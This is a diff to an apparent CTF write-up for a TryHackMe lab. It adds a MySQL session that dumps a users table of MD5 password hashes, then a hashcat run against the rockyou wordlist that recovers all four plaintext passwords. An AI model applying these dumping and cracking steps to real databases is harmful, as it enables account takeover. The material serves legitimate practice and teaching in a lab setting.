@@ -370,6 +370,37 @@ MySQL [(none)]>
 
 ``` bash
 
+MySQL [(none)]> USE timetracking;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [timetracking]> SHOW TABLES;
++------------------------+
+| Tables_in_timetracking |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.038 sec)
+
+MySQL [timetracking]> SELECT * FROM users;
++----------+----------------------------------+-------+
+| user     | pass                             | time  |
++----------+----------------------------------+-------+
+| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
+| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
+| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
+| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
++----------+----------------------------------+-------+
+4 rows in set (0.038 sec)
+
+MySQL [timetracking]>
+
+
+```
+
+``` bash
+
 ❯ hashid '2ac9cb7dc02b3c0083eb70898e549b63'
 Analyzing '2ac9cb7dc02b3c0083eb70898e549b63'
 [+] MD2
@@ -403,3 +434,78 @@ d5c0607301ad5d5c1528962a83992ac8
 4a04890400b5d7bac101baace5d7e994
 
 ```
+
+
+``` bash
+
+❯ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2936/5873 MB (1024 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 4 digests; 4 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 514 MB (6410 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+d5c0607301ad5d5c1528962a83992ac8:sunshine1
+0d107d09f5bbe40cade3de5c71e9e9b7:letmein
+2ac9cb7dc02b3c0083eb70898e549b63:Password1
+4a04890400b5d7bac101baace5d7e994:sandwich
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: hashes.txt
+Time.Started.....: Thu Sep  3 11:03:46 2026 (0 secs)
+Time.Estimated...: Thu Sep  3 11:03:46 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   983.8 kH/s (0.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 4/4 (100.00%) Digests (total), 4/4 (100.00%) Digests (new)
+Progress.........: 16384/14344385 (0.11%)
+Rejected.........: 0/16384 (0.00%)
+Restore.Point....: 8192/14344385 (0.06%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: total90 -> cocoliso
+
+Started: Thu Sep  3 11:03:30 2026
+Stopped: Thu Sep  3 11:03:48 2026
+╭─ ~/hacking/ctf/thm/medium/umbrella/recon                                                                   ✔ │ 18s ─╮
+╰─                                                                                                                   ─╯
+
+
+```
+
+
+
